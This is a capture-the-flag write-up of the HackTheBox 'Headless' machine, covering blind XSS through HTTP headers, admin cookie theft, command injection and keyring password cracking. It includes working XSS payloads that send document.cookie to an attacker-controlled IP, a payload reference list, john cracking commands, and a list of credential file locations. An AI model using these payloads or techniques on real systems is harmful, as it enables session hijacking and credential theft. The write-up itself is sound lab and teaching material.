# HTB Headless — Full Writeup

## Box Info

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux |
| Difficulty | Easy |
| Stack | Python / Flask |
| Key Concepts | Blind XSS, HTTP Header Injection, Cookie Stealing, Flask Cookies |

## Attack Flow

Nmap → Discover Flask app on port 5000 → Find support/contact form → Discover script tags are sanitized but headers are logged → Blind XSS via HTTP headers (User-Agent/Referer/X-Forwarded-For) → Admin reviews logs, XSS fires → Steal admin Flask cookie → Access admin dashboard → Command injection via dashboard → Shell as dvir → Privesc to root

## Phase 1: Enumeration

Nmap found port 22 (SSH) and port 5000 (HTTP — Python Flask app).

The web app has:
- `index.html` — landing page
- A support/contact form for submitting messages
- `hackattempt.html` — "Hacking Attempt Detected" page that displays when suspicious input is detected

## Phase 2: XSS Discovery

### What Didn't Work

Injecting `<script>` tags directly into the comment/message field — they get sanitized/stripped.

### What Worked — Blind XSS via HTTP Headers

When the app detects a "hacking attempt" (like HTML in the comment field), it logs the entire HTTP request including headers. An admin periodically reviews these logs through `inspect_reports.py`, and the headers are rendered **unsanitized** in the admin's browser.

This is the same concept as PHP log poisoning — inject a payload into a header, it gets written to a log, and when someone views that log the payload executes. The difference: PHP log poisoning gives server-side RCE, XSS via headers gives client-side execution in the viewer's browser.

### The Attack

1. Set up a listener to catch the cookie:

```bash
python3 -m http.server 1337
```

2. Send a request with XSS payloads in multiple HTTP headers and something suspicious in the body to trigger the "hacking attempt" logging:

```
POST /support HTTP/1.1
Host: 10.129.92.1:5000
User-Agent: <img src=x onerror="new Image().src='http://YOUR_IP:1337/?c='+document.cookie;">
Referer: <img src=x onerror="new Image().src='http://YOUR_IP:1337/?c='+document.cookie;">
X-Forwarded-For: <img src=x onerror="new Image().src='http://YOUR_IP:1337/?c='+document.cookie;">
Content-Type: application/x-www-form-urlencoded

message=<h1>test</h1>&...
```

The `<img src=x onerror=...>` payload bypasses script tag filters because it uses an event handler on an image tag, not `<script>` tags.

3. Wait for the admin to review the logs. The Python server catches the request with the admin's cookie:

```
GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

### Why This Works

- The comment body triggers the "hacking attempt" detection so the request gets logged
- The headers (User-Agent, Referer, X-Forwarded-For) are stored in the log as-is, no sanitization
- When the admin views the log, the `<img>` tag renders in their browser
- The `onerror` fires because `src=x` fails to load, executing the JS
- The JS creates a new Image object pointing to your server with the admin's cookie as a parameter
- `<script>` tags were filtered, but `<img onerror>` was not

### XSS Cookie Stealing Payloads Reference

Script tag version (blocked on this box):
```html
<script>new Image().src='http://IP:PORT/?c='+document.cookie;</script>
```

Img onerror version (what worked):
```html
<img src=x onerror="new Image().src='http://IP:PORT/?c='+document.cookie;">
```

Simpler fetch version:
```html
<img src=x onerror="fetch('http://IP:PORT/?c='+document.cookie)">
```

## Phase 3: Admin Dashboard → RCE

With the stolen admin cookie (`is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`), access the admin dashboard by setting the cookie in your browser or Burp.

The dashboard has functionality that calls server-side commands (likely through `report.sh` or similar). This endpoint is vulnerable to **command injection** — inject a reverse shell payload to get a shell as `dvir`.

### Flask Cookie Notes

Flask cookies are base64 encoded and signed (not encrypted). You can decode them:

```bash
# Using flask-unsign
flask-unsign --decode --cookie 'ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0'
```

The signature prevents tampering but the contents are readable. If you find the secret key (in app.py or .env), you can forge cookies with `flask-unsign --sign`.

## Phase 4: Privilege Escalation

### Interesting Files on Box

```
~/app/
├── app.py              # Flask application
├── dashboard.html      # Admin dashboard
├── hackattempt.html     # Hacking attempt warning page
├── hacking_reports/     # Where logged "hacking attempts" are stored
├── index.html           # Main page
├── inspect_reports.py   # Script admin uses to review reports (renders XSS)
├── report.sh            # Report generation script
```

### Credential Hunting

Found GNOME Keyring files at `~/.local/share/keyrings/`:
- `login.keyring` — encrypted master keyring (password = user's login password)
- `user.keystore` — Java KeyStore, also encrypted

Extracted hash with `keyring2john`:
```bash
keyring2john login.keyring > hash.txt
# Hash format: $keyring$dbb55bab318fe758*3351*16*0*c65e950f06e2f7dbb3180f5f753ddcc7
john hash.txt --format=keyring --wordlist=/usr/share/wordlists/rockyou.txt
```

GNOME Keyring master password is typically the user's login password — cracking it gives you the user's password for `sudo`.

### Root

Check for sudo permissions, SUID binaries, cron jobs, and capabilities:
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
getcap -r / 2>/dev/null
```

## Methodology Notes

### Blind XSS via HTTP Headers

When to try this:
- You find a form that logs or records submitted requests
- The app has an admin panel or log viewer
- Direct XSS in form fields is sanitized but you suspect headers aren't

Headers to inject into:
- `User-Agent` — almost always logged
- `Referer` — commonly logged
- `X-Forwarded-For` — commonly logged
- `Cookie` — sometimes logged
- `Accept-Language` — rarely sanitized

The key insight: you need TWO things to happen:
1. Your payload must get **stored** (the header is logged)
2. The log must be **viewed** by someone whose browser renders the HTML (the admin)

### XSS vs Log Poisoning Comparison

| | XSS via Headers | PHP Log Poisoning |
|---|---|---|
| Injection point | HTTP headers | HTTP headers |
| Where payload is stored | Application logs | Web server logs (access.log) |
| How it triggers | Admin views logs in browser | LFI includes log file |
| Execution context | Client-side (admin's browser) | Server-side (PHP engine) |
| Result | Cookie theft, session hijack | RCE on server |
| Can get reverse shell? | Not directly (runs in browser) | Yes (server-side PHP execution) |

### GNOME Keyring for Pentesting

- Location: `~/.local/share/keyrings/`
- Hidden directory (need `ls -la` to see `.local`)
- Master password usually = user's login password
- Extract hash: `keyring2john login.keyring`
- Format: `$keyring$...*iterations*...`
- If cracked, try the password for `sudo`, `su root`, SSH

### Hidden Files Enumeration

Always use `ls -la` not `ls`. Key hidden locations:
- `~/.local/share/keyrings/` — GNOME Keyring
- `~/.ssh/` — SSH keys
- `~/.bash_history` — command history
- `~/.env` or app `.env` — credentials
- `~/.config/` — app configs
- `~/.gnupg/` — GPG keys
- `~/.mozilla/` — Firefox saved passwords

### Upgrading Truncated Shells

If your shell output is cut off (lines wrapping/truncating):
```bash
stty columns 200
# or
export COLUMNS=200
```

For reverse shells, full upgrade:
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 columns 200
```
